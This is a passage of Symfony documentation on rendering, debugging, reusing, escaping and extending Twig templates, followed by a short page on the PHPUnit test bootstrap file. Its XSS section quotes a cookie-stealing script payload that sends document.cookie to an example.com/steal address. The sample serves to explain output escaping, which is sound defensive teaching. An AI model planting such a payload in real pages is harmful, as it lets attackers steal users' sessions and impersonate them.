If your controller extends from the :ref:`AbstractController <the-base-controller-class-services>`,
use the ``render()`` helper::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class ProductController extends AbstractController
    {
        public function index(): Response
        {
            // ...

            // the `render()` method returns a `Response` object with the
            // contents created by the template
            return $this->render('product/index.html.twig', [
                'category' => '...',
                'promotions' => ['...', '...'],
            ]);

            // the `renderView()` method only returns the contents created by the
            // template, so you can use those contents later in a `Response` object
            $contents = $this->renderView('product/index.html.twig', [
                'category' => '...',
                'promotions' => ['...', '...'],
            ]);

            return new Response($contents);
        }
    }

If your controller does not extend from ``AbstractController``, you'll need to
:ref:`fetch services in your controller <controller-accessing-services>` and
use the ``render()`` method of the ``twig`` service.

.. _templates-template-attribute:

Another option is to use the ``#[Template()]`` attribute on the controller method
to define the template to render::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use Symfony\Bridge\Twig\Attribute\Template;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class ProductController extends AbstractController
    {
        #[Template('product/index.html.twig')]
        public function index(): array
        {
            // ...

            // when using the #[Template()] attribute, you only need to return
            // an array with the parameters to pass to the template (the attribute
            // is the one which will create and return the Response object).
            return [
                'category' => '...',
                'promotions' => ['...', '...'],
            ];
        }
    }

The :ref:`base AbstractController <the-base-controller-classes-services>` also provides the
:method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::renderBlock`
and :method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::renderBlockView`
methods::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class ProductController extends AbstractController
    {
        // ...

        public function price(): Response
        {
            // ...

            // the `renderBlock()` method returns a `Response` object with the
            // block contents
            return $this->renderBlock('product/index.html.twig', 'price_block', [
                // ...
            ]);

            // the `renderBlockView()` method only returns the contents created by the
            // template block, so you can use those contents later in a `Response` object
            $contents = $this->renderBlockView('product/index.html.twig', 'price_block', [
                // ...
            ]);

            return new Response($contents);
        }
    }

This might come handy when dealing with blocks in
:ref:`templates inheritance <template_inheritance-layouts>` or when using
`Turbo Streams`_.

Rendering a Template in Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Inject the ``twig`` Symfony service into your own services and use its
``render()`` method. When using :doc:`service autowiring </service_container/autowiring>`
you only need to add an argument in the service constructor and type-hint it with
the `Twig Environment`_::

    // src/Service/SomeService.php
    namespace App\Service;

    use Twig\Environment;

    class SomeService
    {
        public function __construct(
            private Environment $twig,
        ) {
        }

        public function someMethod(): void
        {
            // ...

            $htmlContents = $this->twig->render('product/index.html.twig', [
                'category' => '...',
                'promotions' => ['...', '...'],
            ]);
        }
    }

Rendering a Template in Emails
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Read the docs about the :ref:`mailer and Twig integration <mailer-twig>`.

.. _templates-render-from-route:

Rendering a Template Directly from a Route
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Although templates are usually rendered in controllers and services, you can
render static pages that don't need any variables directly from the route
definition. Use the special :class:`Symfony\\Bundle\\FrameworkBundle\\Controller\\TemplateController`
provided by Symfony:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        acme_privacy:
            path:          /privacy
            controller:    Symfony\Bundle\FrameworkBundle\Controller\TemplateController
            defaults:
                # the path of the template to render
                template:  'static/privacy.html.twig'

                # the response status code (default: 200)
                statusCode: 200

                # special options defined by Symfony to set the page cache
                maxAge:    86400
                sharedAge: 86400

                # whether or not caching should apply for client caches only
                private: true

                # optionally you can define some arguments passed to the template
                context:
                    site_name: 'ACME'
                    theme: 'dark'

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="acme_privacy"
                path="/privacy"
                controller="Symfony\Bundle\FrameworkBundle\Controller\TemplateController">
                <!-- the path of the template to render -->
                <default key="template">static/privacy.html.twig</default>

                <!-- the response status code (default: 200) -->
                <default key="statusCode">200</default>

                <!-- special options defined by Symfony to set the page cache -->
                <default key="maxAge">86400</default>
                <default key="sharedAge">86400</default>

                <!-- whether or not caching should apply for client caches only -->
                <default key="private">true</default>

                <!-- optionally you can define some arguments passed to the template -->
                <default key="context">
                    <default key="site_name">ACME</default>
                    <default key="theme">dark</default>
                </default>
            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        use Symfony\Bundle\FrameworkBundle\Controller\TemplateController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('acme_privacy', '/privacy')
                ->controller(TemplateController::class)
                ->defaults([
                    // the path of the template to render
                    'template'  => 'static/privacy.html.twig',

                    // the response status code (default: 200)
                    'statusCode' => 200,

                    // special options defined by Symfony to set the page cache
                    'maxAge'    => 86400,
                    'sharedAge' => 86400,

                    // whether or not caching should apply for client caches only
                    'private' => true,

                    // optionally you can define some arguments passed to the template
                    'context' => [
                        'site_name' => 'ACME',
                        'theme' => 'dark',
                    ]
                ])
            ;
        };

Checking if a Template Exists
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Templates are loaded in the application using a `Twig template loader`_, which
also provides a method to check for template existence. First, get the loader::

    use Twig\Environment;

    class YourService
    {
        // this code assumes that your service uses autowiring to inject dependencies
        // otherwise, inject the service called 'twig' manually
        public function __construct(Environment $twig)
        {
            $loader = $twig->getLoader();
        }
    }

Then, pass the path of the Twig template to the ``exists()`` method of the loader::

    if ($loader->exists('theme/layout_responsive.html.twig')) {
        // the template exists, do something
        // ...
    }

Debugging Templates
-------------------

Symfony provides several utilities to help you debug issues in your templates.

Linting Twig Templates
~~~~~~~~~~~~~~~~~~~~~~

The ``lint:twig`` command checks that your Twig templates don't have any syntax
errors. It's useful to run it before deploying your application to production
(e.g. in your continuous integration server):

.. code-block:: terminal

    # check all the application templates
    $ php bin/console lint:twig

    # you can also check directories and individual templates
    $ php bin/console lint:twig templates/email/
    $ php bin/console lint:twig templates/article/recent_list.html.twig

    # you can also show the deprecated features used in your templates
    $ php bin/console lint:twig --show-deprecations templates/email/

    # you can also excludes directories
    $ php bin/console lint:twig templates/ --excludes=data_collector --excludes=dev_tool

.. versionadded:: 7.1

    The option to exclude directories was introduced in Symfony 7.1.

When running the linter inside `GitHub Actions`_, the output is automatically
adapted to the format required by GitHub, but you can force that format too:

.. code-block:: terminal

    $ php bin/console lint:twig --format=github

Inspecting Twig Information
~~~~~~~~~~~~~~~~~~~~~~~~~~~

The ``debug:twig`` command lists all the information available about Twig
(functions, filters, global variables, etc.). It's useful to check if your
:ref:`custom Twig extensions <templates-twig-extension>` are working properly
and also to check the Twig features added when :ref:`installing packages <symfony-flex>`:

.. code-block:: terminal

    # list general information
    $ php bin/console debug:twig

    # filter output by any keyword
    $ php bin/console debug:twig --filter=date

    # pass a template path to show the physical file which will be loaded
    $ php bin/console debug:twig @Twig/Exception/error.html.twig

.. _twig-dump-utilities:

The Dump Twig Utilities
~~~~~~~~~~~~~~~~~~~~~~~

Symfony provides a :ref:`dump() function <components-var-dumper-dump>` as an
improved alternative to PHP's ``var_dump()`` function. This function is useful
to inspect the contents of any variable and you can use it in Twig templates too.

First, make sure that the VarDumper component is installed in the application:

.. code-block:: terminal

    $ composer require --dev symfony/debug-bundle

Then, use either the ``{% dump %}`` tag or the ``{{ dump() }}`` function
depending on your needs:

.. code-block:: html+twig

    {# templates/article/recent_list.html.twig #}
    {# the contents of this variable are sent to the Web Debug Toolbar
       instead of dumping them inside the page contents #}
    {% dump articles %}

    {% for article in articles %}
        {# the contents of this variable are dumped inside the page contents
           and they are visible on the web page #}
        {{ dump(article) }}

        {# optionally, use named arguments to display them as labels next to
           the dumped contents #}
        {{ dump(blog_posts: articles, user: app.user) }}

        <a href="/article/{{ article.slug }}">
            {{ article.title }}
        </a>
    {% endfor %}

To avoid leaking sensitive information, the ``dump()`` function/tag is only
available in the ``dev`` and ``test`` :ref:`configuration environments <configuration-environments>`.
If you try to use it in the ``prod`` environment, you will see a PHP error.

.. _templates-reuse-contents:

Reusing Template Contents
-------------------------

.. _templates-include:

Including Templates
~~~~~~~~~~~~~~~~~~~

If certain Twig code is repeated in several templates, you can extract it into a
single "template fragment" and include it in other templates. Imagine that the
following code to display the user information is repeated in several places:

.. code-block:: html+twig

    {# templates/blog/index.html.twig #}

    {# ... #}
    <div class="user-profile">
        <img src="{{ user.profileImageUrl }}" alt="{{ user.fullName }}"/>
        <p>{{ user.fullName }} - {{ user.email }}</p>
    </div>

First, create a new Twig template called ``blog/_user_profile.html.twig`` (the
``_`` prefix is optional, but it's a convention used to better differentiate
between full templates and template fragments).

Then, remove that content from the original ``blog/index.html.twig`` template
and add the following to include the template fragment:

.. code-block:: twig

    {# templates/blog/index.html.twig #}

    {# ... #}
    {{ include('blog/_user_profile.html.twig') }}

The ``include()`` Twig function takes as argument the path of the template to
include. The included template has access to all the variables of the template
that includes it (use the `with_context`_ option to control this).

You can also pass variables to the included template. This is useful for example
to rename variables. Imagine that your template stores the user information in a
variable called ``blog_post.author`` instead of the ``user`` variable that the
template fragment expects. Use the following to *rename* the variable:

.. code-block:: twig

    {# templates/blog/index.html.twig #}

    {# ... #}
    {{ include('blog/_user_profile.html.twig', {user: blog_post.author}) }}

.. _templates-embed-controllers:

Embedding Controllers
~~~~~~~~~~~~~~~~~~~~~

:ref:`Including template fragments <templates-include>` is useful to reuse the
same content on several pages. However, this technique is not the best solution
in some cases.

Imagine that the template fragment displays the three most recent blog articles.
To do that, it needs to make a database query to get those articles. When using
the ``include()`` function, you'd need to do the same database query in every
page that includes the fragment. This is not very convenient.

A better alternative is to **embed the result of executing some controller**
with the ``render()`` and ``controller()`` Twig functions.

First, create the controller that renders a certain number of recent articles::

    // src/Controller/BlogController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    // ...

    class BlogController extends AbstractController
    {
        public function recentArticles(int $max = 3): Response
        {
            // get the recent articles somehow (e.g. making a database query)
            $articles = ['...', '...', '...'];

            return $this->render('blog/_recent_articles.html.twig', [
                'articles' => $articles
            ]);
        }
    }

Then, create the ``blog/_recent_articles.html.twig`` template fragment (the
``_`` prefix in the template name is optional, but it's a convention used to
better differentiate between full templates and template fragments):

.. code-block:: html+twig

    {# templates/blog/_recent_articles.html.twig #}
    {% for article in articles %}
        <a href="{{ path('blog_show', {slug: article.slug}) }}">
            {{ article.title }}
        </a>
    {% endfor %}

Now you can call to this controller from any template to embed its result:

.. code-block:: html+twig

    {# templates/base.html.twig #}

    {# ... #}
    <div id="sidebar">
        {# if the controller is associated with a route, use the path() or url() functions #}
        {{ render(path('latest_articles', {max: 3})) }}
        {{ render(url('latest_articles', {max: 3})) }}

        {# if you don't want to expose the controller with a public URL,
           use the controller() function to define the controller to execute #}
        {{ render(controller(
            'App\\Controller\\BlogController::recentArticles', {max: 3}
        )) }}
    </div>

.. _fragments-path-config:

When using the ``controller()`` function, controllers are not accessed using a
regular Symfony route but through a special URL used exclusively to serve those
template fragments. Configure that special URL in the ``fragments`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            fragments: { path: /_fragment }

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->
            <framework:config>
                <framework:fragment path="/_fragment"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->fragments()->path('/_fragment');
        };

.. caution::

    Embedding controllers requires making requests to those controllers and
    rendering some templates as result. This can have a significant impact on
    the application performance if you embed lots of controllers. If possible,
    :doc:`cache the template fragment </http_cache/esi>`.

.. _templates-hinclude:

How to Embed Asynchronous Content with hinclude.js
--------------------------------------------------

Templates can also embed contents asynchronously with the ``hinclude.js``
JavaScript library.

First, include the `hinclude.js`_ library in your page
:ref:`linking to it <templates-link-to-assets>` from the template or adding it
to your application JavaScript :doc:`using Webpack Encore </frontend>`.

As the embedded content comes from another page (or controller for that matter),
Symfony uses a version of the standard ``render()`` function to configure
``hinclude`` tags in templates:

.. code-block:: twig

    {{ render_hinclude(controller('...')) }}
    {{ render_hinclude(url('...')) }}

.. note::

    When using the ``controller()`` function, you must also configure the
    :ref:`fragments path option <fragments-path-config>`.

When JavaScript is disabled or it takes a long time to load you can display a
default content rendering some template:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            fragments:
                hinclude_default_template: hinclude.html.twig

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->
            <framework:config>
                <framework:fragments hinclude-default-template="hinclude.html.twig"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->fragments()
                ->hincludeDefaultTemplate('hinclude.html.twig')
            ;
        };

You can define default templates per ``render()`` function (which will override
any global default template that is defined):

.. code-block:: twig

    {{ render_hinclude(controller('...'),  {
        default: 'default/content.html.twig'
    }) }}

Or you can also specify a string to display as the default content:

.. code-block:: twig

    {{ render_hinclude(controller('...'), {default: 'Loading...'}) }}

Use the ``attributes`` option to define the value of hinclude.js options:

.. code-block:: twig

    {# by default, cross-site requests don't use credentials such as cookies, authorization
       headers or TLS client certificates; set this option to 'true' to use them #}
    {{ render_hinclude(controller('...'), {attributes: {'data-with-credentials': 'true'}}) }}

    {# by default, the JavaScript code included in the loaded contents is not run;
       set this option to 'true' to run that JavaScript code #}
    {{ render_hinclude(controller('...'), {attributes: {evaljs: 'true'}}) }}

.. _template_inheritance-layouts:

Template Inheritance and Layouts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

As your application grows you'll find more and more repeated elements between
pages, such as headers, footers, sidebars, etc. :ref:`Including templates <templates-include>`
and :ref:`embedding controllers <templates-embed-controllers>` can help, but
when pages share a common structure, it's better to use **inheritance**.

The concept of `Twig template inheritance`_ is similar to PHP class inheritance.
You define a parent template that other templates can extend from and child
templates can override parts of the parent template.

Symfony recommends the following three-level template inheritance for medium and
complex applications:

* ``templates/base.html.twig``, defines the common elements of all application
  templates, such as ``<head>``, ``<header>``, ``<footer>``, etc.;
* ``templates/layout.html.twig``, extends from ``base.html.twig`` and defines
  the content structure used in all or most of the pages, such as a two-column
  content + sidebar layout. Some sections of the application can define their
  own layouts (e.g. ``templates/blog/layout.html.twig``);
* ``templates/*.html.twig``, the application pages which extend from the main
  ``layout.html.twig`` template or any other section layout.

In practice, the ``base.html.twig`` template would look like this:

.. code-block:: html+twig

    {# templates/base.html.twig #}
    <!DOCTYPE html>
    <html>
        <head>
            <meta charset="UTF-8">
            <title>{% block title %}My Application{% endblock %}</title>
            {% block stylesheets %}
                <link rel="stylesheet" type="text/css" href="/css/base.css"/>
            {% endblock %}
        </head>
        <body>
            {% block body %}
                <div id="sidebar">
                    {% block sidebar %}
                        <ul>
                            <li><a href="{{ path('homepage') }}">Home</a></li>
                            <li><a href="{{ path('blog_index') }}">Blog</a></li>
                        </ul>
                    {% endblock %}
                </div>

                <div id="content">
                    {% block content %}{% endblock %}
                </div>
            {% endblock %}
        </body>
    </html>

The `Twig block tag`_ defines the page sections that can be overridden in the
child templates. They can be empty, like the ``content`` block or define a default
content, like the ``title`` block, which is displayed when child templates don't
override them.

The ``blog/layout.html.twig`` template could be like this:

.. code-block:: html+twig

    {# templates/blog/layout.html.twig #}
    {% extends 'base.html.twig' %}

    {% block content %}
        <h1>Blog</h1>

        {% block page_contents %}{% endblock %}
    {% endblock %}

The template extends from ``base.html.twig`` and only defines the contents of
the ``content`` block. The rest of the parent template blocks will display their
default contents. However, they can be overridden by the third-level inheritance
template, such as ``blog/index.html.twig``, which displays the blog index:

.. code-block:: html+twig

    {# templates/blog/index.html.twig #}
    {% extends 'blog/layout.html.twig' %}

    {% block title %}Blog Index{% endblock %}

    {% block page_contents %}
        {% for article in articles %}
            <h2>{{ article.title }}</h2>
            <p>{{ article.body }}</p>
        {% endfor %}
    {% endblock %}

This template extends from the second-level template (``blog/layout.html.twig``)
but overrides blocks of different parent templates: ``page_contents`` from
``blog/layout.html.twig`` and ``title`` from ``base.html.twig``.

When you render the ``blog/index.html.twig`` template, Symfony uses three
different templates to create the final contents. This inheritance mechanism
boosts your productivity because each template includes only its unique contents
and leaves the repeated contents and HTML structure to some parent templates.

.. caution::

    When using ``extends``, a child template is forbidden to define template
    parts outside of a block. The following code throws a ``SyntaxError``:

    .. code-block:: html+twig

        {# app/Resources/views/blog/index.html.twig #}
        {% extends 'base.html.twig' %}

        {# the line below is not captured by a "block" tag #}
        <div class="alert">Some Alert</div>

        {# the following is valid #}
        {% block content %}My cool blog posts{% endblock %}

Read the `Twig template inheritance`_ docs to learn more about how to reuse
parent block contents when overriding templates and other advanced features.

.. _output-escaping:
.. _xss-attacks:

Output Escaping and XSS Attacks
-------------------------------

Imagine that your template includes the ``Hello {{ name }}`` code to display the
user name and a malicious user sets the following as their name:

.. code-block:: html

    My Name
    <script type="text/javascript">
        document.write('<img src="https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
    </script>

You'll see ``My Name`` on screen but the attacker just secretly stole your cookies
so they can impersonate you on other websites. This is known as a `Cross-Site Scripting`_
or XSS attack.

To prevent this attack, use *"output escaping"* to transform the characters
which have special meaning (e.g. replace ``<`` by the ``&lt;`` HTML entity).
Symfony applications are safe by default because they perform automatic output
escaping:

.. code-block:: html+twig

    <p>Hello {{ name }}</p>
    {# if 'name' is '<script>alert('hello!')</script>', Twig will output this:
       '<p>Hello &lt;script&gt;alert(&#39;hello!&#39;)&lt;/script&gt;</p>' #}

If you are rendering a variable that is trusted and contains HTML contents,
use the `Twig raw filter`_ to disable the output escaping for that variable:

.. code-block:: html+twig

    <h1>{{ product.title|raw }}</h1>
    {# if 'product.title' is 'Lorem <strong>Ipsum</strong>', Twig will output
       exactly that instead of 'Lorem &lt;strong&gt;Ipsum&lt;/strong&gt;' #}

Read the `Twig output escaping docs`_ to learn more about how to disable output
escaping for a block or even an entire template.

.. _templates-namespaces:

Template Namespaces
-------------------

Although most applications store their templates in the default ``templates/``
directory, you may need to store some or all of them in different directories.
Use the ``twig.paths`` option to configure those extra directories. Each path is
defined as a ``key: value`` pair where the ``key`` is the template directory and
the ``value`` is the Twig namespace, which is explained later:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            # ...
            paths:
                # directories are relative to the project root dir (but you
                # can also use absolute directories)
                'email/default/templates': ~
                'backend/templates': ~

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <!-- ... -->
                <!-- directories are relative to the project root dir (but you
                     can also use absolute directories -->
                <twig:path>email/default/templates</twig:path>
                <twig:path>backend/templates</twig:path>
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            // ...

            // directories are relative to the project root dir (but you
            // can also use absolute directories)
            $twig->path('email/default/templates', null);
            $twig->path('backend/templates', null);
        };

When rendering a template, Symfony looks for it first in the ``twig.paths``
directories that don't define a namespace and then falls back to the default
template directory (usually, ``templates/``).

Using the above configuration, if your application renders for example the
``layout.html.twig`` template, Symfony will first look for
``email/default/templates/layout.html.twig`` and ``backend/templates/layout.html.twig``.
If any of those templates exists, Symfony will use it instead of using
``templates/layout.html.twig``, which is probably the template you wanted to use.

Twig solves this problem with **namespaces**, which group several templates
under a logic name unrelated to their actual location. Update the previous
configuration to define a namespace for each template directory:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            # ...
            paths:
                'email/default/templates': 'email'
                'backend/templates': 'admin'

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <!-- ... -->
                <twig:path namespace="email">email/default/templates</twig:path>
                <twig:path namespace="admin">backend/templates</twig:path>
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            // ...

            $twig->path('email/default/templates', 'email');
            $twig->path('backend/templates', 'admin');
        };

Now, if you render the ``layout.html.twig`` template, Symfony will render the
``templates/layout.html.twig`` file. Use the special syntax ``@`` + namespace to
refer to the other namespaced templates (e.g. ``@email/layout.html.twig`` and
``@admin/layout.html.twig``).

.. note::

    A single Twig namespace can be associated with more than one template
    directory. In that case, the order in which paths are added is important
    because Twig will start looking for templates from the first defined path.

Bundle Templates
~~~~~~~~~~~~~~~~

If you :ref:`install packages/bundles <symfony-flex>` in your application, they
may include their own Twig templates (in the ``Resources/views/`` directory of
each bundle). To avoid messing with your own templates, Symfony adds bundle
templates under an automatic namespace created after the bundle name.

For example, the templates of a bundle called ``AcmeBlogBundle`` are available
under the ``AcmeBlog`` namespace. If this bundle includes the template
``<your-project>/vendor/acme/blog-bundle/Resources/views/user/profile.html.twig``,
you can refer to it as ``@AcmeBlog/user/profile.html.twig``.

.. tip::

    You can also :ref:`override bundle templates <override-templates>` in case
    you want to change some parts of the original bundle templates.

.. _templates-twig-extension:

Writing a Twig Extension
------------------------

`Twig Extensions`_ allow the creation of custom functions, filters, and more to use
in your Twig templates. Before writing your own Twig extension, check if
the filter/function that you need is already implemented in:

* The `default Twig filters and functions`_;
* The :doc:`Twig filters and functions added by Symfony </reference/twig_reference>`;
* The `official Twig extensions`_ related to strings, HTML, Markdown, internationalization, etc.

Create the Extension Class
~~~~~~~~~~~~~~~~~~~~~~~~~~

Suppose you want to create a new filter called ``price`` that formats a number
as currency:

.. code-block:: twig

    {{ product.price|price }}

    {# pass in the 3 optional arguments #}
    {{ product.price|price(2, ',', '.') }}

Create a class that extends ``AbstractExtension`` and fill in the logic::

    // src/Twig/AppExtension.php
    namespace App\Twig;

    use Twig\Extension\AbstractExtension;
    use Twig\TwigFilter;

    class AppExtension extends AbstractExtension
    {
        public function getFilters(): array
        {
            return [
                new TwigFilter('price', [$this, 'formatPrice']),
            ];
        }

        public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string
        {
            $price = number_format($number, $decimals, $decPoint, $thousandsSep);
            $price = '$'.$price;

            return $price;
        }
    }

If you want to create a function instead of a filter, define the
``getFunctions()`` method::

    // src/Twig/AppExtension.php
    namespace App\Twig;

    use Twig\Extension\AbstractExtension;
    use Twig\TwigFunction;

    class AppExtension extends AbstractExtension
    {
        public function getFunctions(): array
        {
            return [
                new TwigFunction('area', [$this, 'calculateArea']),
            ];
        }

        public function calculateArea(int $width, int $length): int
        {
            return $width * $length;
        }
    }

.. tip::

    Along with custom filters and functions, you can also register
    `global variables`_.

Register an Extension as a Service
..................................

Next, register your class as a service and tag it with ``twig.extension``. If you're
using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
you're done! Symfony will automatically know about your new service and add the tag.

You can now start using your filter in any Twig template. Optionally, execute
this command to confirm that your new filter was successfully registered:

.. code-block:: terminal

    # display all information about Twig
    $ php bin/console debug:twig

    # display only the information about a specific filter
    $ php bin/console debug:twig --filter=price

.. _lazy-loaded-twig-extensions:

Creating Lazy-Loaded Twig Extensions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Including the code of the custom filters/functions in the Twig extension class
is the simplest way to create extensions. However, Twig must initialize all
extensions before rendering any template, even if the template doesn't use an
extension.

If extensions don't define dependencies (i.e. if you don't inject services in
them) performance is not affected. However, if extensions define lots of complex
dependencies (e.g. those making database connections), the performance loss can
be significant.

That's why Twig allows decoupling the extension definition from its
implementation. Following the same example as before, the first change would be
to remove the ``formatPrice()`` method from the extension and update the PHP
callable defined in ``getFilters()``::

    // src/Twig/AppExtension.php
    namespace App\Twig;

    use App\Twig\AppRuntime;
    use Twig\Extension\AbstractExtension;
    use Twig\TwigFilter;

    class AppExtension extends AbstractExtension
    {
        public function getFilters(): array
        {
            return [
                // the logic of this filter is now implemented in a different class
                new TwigFilter('price', [AppRuntime::class, 'formatPrice']),
            ];
        }
    }

Then, create the new ``AppRuntime`` class (it's not required but these classes
are suffixed with ``Runtime`` by convention) and include the logic of the
previous ``formatPrice()`` method::

    // src/Twig/AppRuntime.php
    namespace App\Twig;

    use Twig\Extension\RuntimeExtensionInterface;

    class AppRuntime implements RuntimeExtensionInterface
    {
        public function __construct()
        {
            // this simple example doesn't define any dependency, but in your own
            // extensions, you'll need to inject services using this constructor
        }

        public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string
        {
            $price = number_format($number, $decimals, $decPoint, $thousandsSep);
            $price = '$'.$price;

            return $price;
        }
    }

If you're using the default ``services.yaml`` configuration, this will already
work! Otherwise, :ref:`create a service <service-container-creating-service>`
for this class and :doc:`tag your service </service_container/tags>` with ``twig.runtime``.

.. _`Cross-Site Scripting`: https://en.wikipedia.org/wiki/Cross-site_scripting
.. _`default Twig filters and functions`: https://twig.symfony.com/doc/3.x/#reference
.. _`filters`: https://twig.symfony.com/doc/3.x/filters/index.html
.. _`functions`: https://twig.symfony.com/doc/3.x/functions/index.html
.. _`GitHub Actions`: https://docs.github.com/en/free-pro-team@latest/actions
.. _`global variables`: https://twig.symfony.com/doc/3.x/advanced.html#id1
.. _`hinclude.js`: https://mnot.github.io/hinclude/
.. _`Turbo Streams`: https://symfony.com/bundles/ux-turbo/current/index.html
.. _`official Twig extensions`: https://github.com/twigphp?q=extra
.. _`snake case`: https://en.wikipedia.org/wiki/Snake_case
.. _`tags`: https://twig.symfony.com/doc/3.x/tags/index.html
.. _`Twig block tag`: https://twig.symfony.com/doc/3.x/tags/block.html
.. _`Twig Environment`: https://github.com/twigphp/Twig/blob/3.x/src/Environment.php
.. _`Twig Extensions`: https://twig.symfony.com/doc/3.x/advanced.html#creating-an-extension
.. _`Twig output escaping docs`: https://twig.symfony.com/doc/3.x/api.html#escaper-extension
.. _`Twig raw filter`: https://twig.symfony.com/doc/3.x/filters/raw.html
.. _`Twig template inheritance`: https://twig.symfony.com/doc/3.x/tags/extends.html
.. _`Twig template loader`: https://twig.symfony.com/doc/3.x/api.html#loaders
.. _`Twig`: https://twig.symfony.com
.. _`UX Live Component`: https://symfony.com/bundles/ux-live-component/current/index.html
.. _`UX Twig Component`: https://symfony.com/bundles/ux-twig-component/current/index.html
.. _`with_context`: https://twig.symfony.com/doc/3.x/functions/include.html
How to Customize the Bootstrap Process before Running Tests
===========================================================

Sometimes when running tests, you need to do additional bootstrap work before
running those tests. For example, if you're running a functional test and
have introduced a new translation resource, then you will need to clear your
cache before running those tests.

When :ref:`installing testing <testing-installation>` using Symfony Flex,
it already created a ``tests/bootstrap.php`` file that is run by PHPUnit
before your tests.

You can modify this file to add custom logic:

.. code-block:: diff

      // tests/bootstrap.php
      use Symfony\Component\Dotenv\Dotenv;

      require dirname(__DIR__).'/vendor/autoload.php';

      if (file_exists(dirname(__DIR__).'/config/bootstrap.php')) {
          require dirname(__DIR__).'/config/bootstrap.php';
      } elseif (method_exists(Dotenv::class, 'bootEnv')) {
          (new Dotenv())->bootEnv(dirname(__DIR__).'/.env');
      }

    + // executes the "php bin/console cache:clear" command
    + passthru(sprintf(
    +   'APP_ENV=%s php "%s/../bin/console" cache:clear --no-warmup',
    +   $_ENV['APP_ENV'],
    +   __DIR__
    + ));

.. note::

    If you don't use Symfony Flex, make sure this file is configured as
    bootstrap file in your ``phpunit.xml.dist`` file:

    .. code-block:: xml

        <!-- phpunit.xml.dist -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <phpunit
            bootstrap="tests/bootstrap.php"
        >
            <!-- ... -->
        </phpunit>

Now, when running ``vendor/bin/phpunit``, the cache will be cleared
automatically by the bootstrap file before running all tests.
How to Test A Doctrine Repository
